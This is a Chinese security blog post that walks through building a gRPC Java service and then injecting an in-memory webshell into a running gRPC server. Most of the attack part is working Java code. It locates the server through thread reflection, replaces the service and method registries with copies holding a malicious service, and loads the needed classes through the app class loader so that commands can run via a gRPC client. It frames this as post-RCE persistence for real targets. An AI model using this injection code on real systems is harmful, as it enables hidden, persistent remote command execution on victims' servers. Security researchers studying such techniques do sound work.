gRPC Java 内存马模拟实战
=================

> 本文相关代码：[grpc-memshell](https://github.com/YPS233/grpc-memshell)

一、gRPC for Java
---------------

> grpc是一个高性能、开源、通用的RPC框架，由Google推出，基于HTTP2协议标准设计开发，默认采用Protocol Buffers数据序列化协议，支持多种开发语言。

主要特性：

- 强大的IDL  
    gRPC使用ProtoBuf来定义服务，ProtoBuf是由Google开发的一种数据序列化协议（类似于XML、JSON、hessian）。
- 多语言支持  
    gRPC支持多种语言，并能够基于语言自动生成客户端和服务端功能库。

简单来说`proto3`是grpc的协议定义，使用的文件后缀为.proto。在客户端调用服务端提供的远程接口前,双方必须进行一些约定,比如接口的方法签名,请求和响应的数据结构等,这个过程称为服务定义。服务定义需要特定的接口定义语言(IDL)来完成,gRPC中默认使用protocol buffers。

通过protobug定义服务后，不同语言通过不同的语言转换为代码，进而创建客户端和服务端。以java为例：

首先创建一个maven项目，在main目录下新建一个proto目录，用来存放.proto后缀的服务文件。

然后修改pom.xml，注意点:

- packaging 的值不能是pom，改成jar
- 添加相关依赖和编译插件
- 插件中配置中的`protoSourceRoot`和`outputDirectory`一定要配置好，编译的时候才能把代码输出到正确的位置

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>grpc</artifactId>
    <packaging>jar</packaging>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <protobuf.version>3.19.4</protobuf.version>
        <grpc.version>1.50.2</grpc.version>
    </properties>

    <dependencies>
        <dependency>
            <groupId>com.google.protobuf</groupId>
            <artifactId>protobuf-java</artifactId>
            <version>${protobuf.version}</version>
        </dependency>

        <dependency>
            <groupId>io.grpc</groupId>
            <artifactId>grpc-all</artifactId>
            <version>${grpc.version}</version>
        </dependency>
    </dependencies>

    <build>
        <!-- os系统信息插件, protobuf-maven-plugin需要获取系统信息下载相应的protobuf程序 -->
        <extensions>
            <extension>
                <groupId>kr.motd.maven</groupId>
                <artifactId>os-maven-plugin</artifactId>
                <version>1.6.2</version>
            </extension>
        </extensions>
        <plugins>
            <plugin>
                <groupId>org.xolstice.maven.plugins</groupId>
                <artifactId>protobuf-maven-plugin</artifactId>
                <version>0.6.1</version>

                <configuration>
                    <protocArtifact>com.google.protobuf:protoc:3.14.0:exe:${os.detected.classifier}</protocArtifact>
                    <pluginId>grpc-java</pluginId>
                    <pluginArtifact>io.grpc:protoc-gen-grpc-java:${grpc.version}:exe:${os.detected.classifier}</pluginArtifact>
                    <!-- proto文件目录 -->
                    <protoSourceRoot>${project.basedir}/src/main/proto/</protoSourceRoot>
                    <!-- 生成的Java文件目录 -->
                    <outputDirectory>${project.basedir}/src/main/java/</outputDirectory>
                    <clearOutputDirectory>false</clearOutputDirectory>
                </configuration>
                <executions>
                    <execution>
                        <goals>
                            <goal>compile</goal>
                            <goal>compile-custom</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>

</project>
```

然后创建一个`user.proto`文件，内容：

```php
syntax = "proto3";
package protocol;

option go_package = "protocol";
option java_multiple_files = true;
option java_package = "com.demo.shell.protocol";

message User {
  int32 userId = 1;
  string username = 2;
  sint32 age = 3;
  string name = 4;
}

service UserService {
  rpc getUser (User) returns (User) {}
  rpc getUsers (User) returns (stream User) {}
  rpc saveUsers (stream User) returns (User) {}
}
```

这里不讨论服务的语法，只用来新建项目。  
然后执行mvn命令生成对应的java代码:

```php
mvn protobuf:compile
mvn protobuf:compile-custom
```

完成后目录结构如图：  
![16709239915821.jpg](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-c10790fefb7a2e03d536d6d2e1e49b238a1eb6b9.jpg)

生成的代码中会包对在proto中写好的DAO和接口，可以直接用来写server逻辑

然后开始编写服务端：  
继承`UserServiceGrpc.UserServiceImplBase`，重写需要的代码即可

重写后，编写server

```java
public class NsServer {
    public static void main(String[] args) throws IOException, InterruptedException {
        int port = 8082;
        Server server = ServerBuilder.forPort(port).addService(new UserServiceImpl()).build().start();
        System.out.println("server started, port : " + port);
        server.awaitTermination();
    }
}
```

clent发送请求

```java
public class NsCilent {
    public static void main(String[] args) {
        User user = User.newBuilder().setUserId(100).build();
        String host = "127.0.0.1";
        int port = 8082;

        ManagedChannel channel = ManagedChannelBuilder.forAddress(host,port).usePlaintext().build();
        UserServiceGrpc.UserServiceBlockingStub userServiceBlockingStub = UserServiceGrpc.newBlockingStub(channel);
        User responseUser = userServiceBlockingStub.getUser(user);
        System.out.println(responseUser);

        Iterator<User> users = userServiceBlockingStub.getUsers(user);
        while (users.hasNext()){
            System.out.println(users.next());
        }
        channel.shutdown();
    }
}
```

代码参考  
<https://github.com/Snailll/gRPCDemo>

二、流程调试&amp;内存马
--------------

在server中下断点调试下就会发现`addService()`最终执行的是`io.grpc.internal.InternalHandlerRegistry$Builder#addService`  
Builder是个内部类。`this.services`和`this.map`中保存了所有的service和methods，添加也是在这个数组中添加。

![16709272288300.jpg](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-7aac95a85f578f05f61a2937fc23fd50082c3092.jpg)

初始化services和map的流程：

1. 通过`ServerBuilder.forPort(port)`获取`ServerBuilder`对象
2. 关键代码：`ServerBuilder.forPort(port).addService(new UserServiceImpl()).build().start();`
3. 先调用`InternalHandlerRegistry$Builder#addService`添加this.services，然后调用`InternalHandlerRegistry$Builder#build`从service中解析出接口映射，初始化this.map中，最后返回初始化好的`InternalHandlerRegistry`，继续初始化好其他需要的内容。  
    ![16710050709930.jpg](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-a4e971a611675985db0d7be297e4f082025d924a.jpg)
4. 调用start()启动监听

因此想实现内存马，就要构造一个恶意的service和相关接口，并注册到这个services中，methods同理，三个条件

1. 能够获取到services列表
2. 能创建自定义services接口
3. 能把自定义的service加入到内存中

解决思路：

1. 从请求上下文反射获取services列表
2. 考虑把相关的类都动态加载进去，5个class，生成的代码很长，不一定成功
3. 这里`services`的值是`Collections$Unmodifiable`开头的List，带有`$Unmodifiable`的list和map是无法直接修改的，需要先反射获取`services`和`methods`，然后用浅拷贝得创建一个的可以修改的对象，再用反射把修改后的值赋值回去。

三、实战环境思考
--------

真实利用环境思考：单独使用grpc服务或者使用springboot托管grpc server

情形一 单独使用grpc：

- 已有grpc客户端，可以正常访问grpc服务端，在服务端发现了已有接口的RCE漏洞，可以执行java代码
- 客户端发起rpc请求之后，server端的处理线程环境下会存在server对象，可以用来注入，线程名：`grpc-default-executor-0`

![16710115830929.jpg](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-3b5f0bd134def4169c13ffdbe257d6d0be4ac2a2.jpg)

情形二，grpc+springboot 搜索了一下有专门的支持`grpc-server-spring-boot-starter`：

- grpc服务和其他java服务同时存在，比如由springboot管理grpc的bean
- springboot提供的服务中存在可以rce的点，可以执行任意代码
- 这种情况下可以尝试通过web请求的上下文获取grpc的server对象，用来注入

在springboot http请求上下文线程中也能找到关键的registry，但是这个是在GrpcServerLifecycle中，可能有一个生命周期限制

![16710935793719.jpg](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-784aba47018a475e576f6d91b82e968e648b0089.jpg)

![16710936375738.jpg](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-e36e5d9bcffbc83b3e1316ca7a9c57eb40dcf802.jpg)

这里以springboot+grpc为例，写一个注入代码，springboot注册一个路由，模拟任意代码执行，**并且假设相关的依赖已经存在于环境中了**，注入思路：

首先利用反射获取当前上下文线程中的serverimpl对象，然后调用inject()进行注入：

```java
ThreadGroup group = Thread.currentThread().getThreadGroup();
Thread[] threads = new Thread[group.activeCount()];
String status = "";

group.enumerate(threads);

for(Thread t : threads){
    if(t.getName().startsWith("grpc-server-container")){
        System.out.println("found grpc-server-container: ");
        System.out.println(t.getName());

        Field target = Thread.class.getDeclaredField("target");
        target.setAccessible(true);
        Object o = target.get(t);

        //这里是一个GrpcServerLifecycle$lambda，遍历拿到里面的GrpcServerLifecycle
        Field[] ff = o.getClass().getDeclaredFields();
        ff[0].setAccessible(true);
        GrpcServerLifecycle grpcServerLifecycle = (GrpcServerLifecycle)ff[0].get(o);

        // 通过GrpcServerLifecycle，反射获取 server对象
        Field server = GrpcServerLifecycle.class.getDeclaredField("server");
        server.setAccessible(true);
        ServerImpl serverimpl = (ServerImpl) server.get(grpcServerLifecycle);

        inject(serverimpl);
        status = "inject success";
        break;
    }
}

```

用反射从server中一步一步获取到当先环境中已经注册的services

```java
// 从server中获取registry
Field registry = server.getClass().getDeclaredField("registry");
registry.setAccessible(true);
Object handlerRegistry = registry.get(server);

// 从registry获取services和methods
Class InternalHandlerRegistry = Class.forName("io.grpc.internal.InternalHandlerRegistry");
Field services = InternalHandlerRegistry.getDeclaredField("services");
services.setAccessible(true);
List<ServerServiceDefinition> ser = (List<ServerServiceDefinition>)services.get(handlerRegistry);

Field methods = InternalHandlerRegistry.getDeclaredField("methods");
methods.setAccessible(true);
Map<String, ServerMethodDefinition<?, ?>> meth = (Map<String, ServerMethodDefinition<?, ?>>)methods.get(handlerRegistry);

```

手动初始化一个带有恶意接口的server对象，并获取其中的services和methods

```java
// 初始化一个带有恶意接口的Server对象，并获取其中的services和methods，添加到当前服务中
Server hr = ServerBuilder.forPort(8082).addService(new WebshellServiceImpl()).build();

Object hr_registry = NsServer.getField(hr,"registry");
List<ServerServiceDefinition> webshell_ser_list = (List<ServerServiceDefinition>)services.get(hr_registry);
Map<String, ServerMethodDefinition<?, ?>> webshell_meth = (Map<String, ServerMethodDefinition<?, ?>>)methods.get(hr_registry);
```

浅拷贝把原来的接口信息都复制到新的对象中

```java

List<ServerServiceDefinition> new_ser = new ArrayList<>(ser);
Map new_meth = new HashMap(meth);

// 把恶意对象的信息添加到新的对象
for(ServerServiceDefinition ssd : webshell_ser_list){
    new_ser.add(ssd);
}

for(String key : webshell_meth.keySet()){
    new_meth.put(key,webshell_meth.get(key));
}

// 反射把registry的services和methods都替换为新创建的对象
services.set(handlerRegistry, new_ser);
methods.set(handlerRegistry, new_meth);

```

这样就完成了注入，可以直接访问恶意的api了

### 动态加载类作为依赖的问题

剩下的一个问题，这个代码里面的webshell相关类是在开发时就写在代码里的，实际利用的时候不可能有，需要想办法动态创建服务，在官方文档中没找到类似的功能，只能考虑手动把相关代码都动态加载。

考虑解决方案的时候，遇到依赖问题，发现这是一个指的思考的问题，最开始使用类似冰蝎的方法，自定义个一个类加载器，去加载发现加载的第一个类无法作为第二个类的依赖，换句话说JVM的缓存里找不到前面动态加载的类。

测试结果标明，用自定义类加载器使用defindclass加载一个类后，函数会返回这个类的class对象，但是这个类并不在缓存中，使用findclass或者findLoadedClass都找不到这个类

这个问题转化一下其实就是defineclass之后，会获得一个class对象，但是这个class对象是否保存在了JVM的缓存中，这涉及到JVM寻找一个类的机制

分析原理，这里是自定义了一个加载器U，新建一个U的对象classloader，通过defineclass加载了一个类，debug发现这个类的信息是挂在`classloader`对象下面的，classloader的父类是`AppClassLoader`，可以看到有3596个class缓存：  
![image2022-12-22_15-51-57.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-4b008325a01952ffe248c7c7d2c20ec87d170cf8.png)

遍历出来发现果然没有我们加载的类

观察`ClassLoader$classes`的注释：  
![image2022-12-22_15-52-30.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-8e90cbc18691a01686f22edd896de3570c2f6df0.png)  
注释说明这个字段的作用是保证这里面的类不被GC，间接说明了这些是需要保留的缓存

这里猜测，在上下文过来的时候，加载类A依赖类B，开始寻找类B，当前上下文的ClassLoader遵循双亲委派机制逐级调用findClass，但是这个类注册在了最下级，肯定找不到，虽然JVM并不是通过这个字段里的列表来判断类是不是已经加载，但是由此可以猜想，如果能够用AppClassLoaer加载器或者更上级的动态加载一个类，是不是就可以被搜索到并作为依赖？

测试证明结论正确，修改调用definclass的方式，改成反射调用当前线程的defineclass，就可以被搜索到作为依赖。这里使用的是`this.getClass().getClassLoader()`当前线程加载器。也可以使用`ClassLoader.getSystemClassLoader()`。另外`new URLClassLoader(new URL[]{}`没测试，可能也能用。

```php
Method define = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
define.setAccessible(true);
Class c1 = (Class)define.invoke(this.getClass().getClassLoader(),className, bytes, 0,bytes.length);
```

下一步就需要把grpc内存马强依赖的类逐个动态加载起来  
proto生成了5个类，编译后会有很多内部类，一共有18个class文件，不断测试后确定最少的依赖是9个class文件，并且有严格的加载顺序，否则就会产生鸡生蛋蛋生鸡问题

![image2022-12-22_15-57-13.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-b4e05946bd49338e14f43e28e1a0e0c4b180d60e.png)

另外执行命令还需要DAO的Builder

```php
loadTargetClass("com.demo.shell.protocol.Webshell$Builder", "/Users/yps/Public/Code/JavaProject/grpc/src/main/resources/Webshell$Builder.class");
```

将springboot打包成jar，访问localhost:8080/name/user 进行grpc内存马注入，这里注入的字节码都是保存在项目里了，实战可以从web传进去

注入之后通过grpc-client执行命令  
![image2022-12-22_16-25-56.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-33bfbef833b7ac56c3e96fbd6aa1695a7adce28f.png)

总结
--

grpc协议可以用来植入内存马，但是动静很大，需要先本地生成好对应的代码，本地测试，再逐个加载到模板进程中，相对于权限维持这个目标来说有点雷声大雨点小的感觉，并且如果想方便的利用内存马， 还需要用grpc写一个各种功能的客户端，工作量也不小。

参考链接
----

<http://blog.nsfocus.net/grpc/>  
<https://github.com/Snailll/gRPCDemo>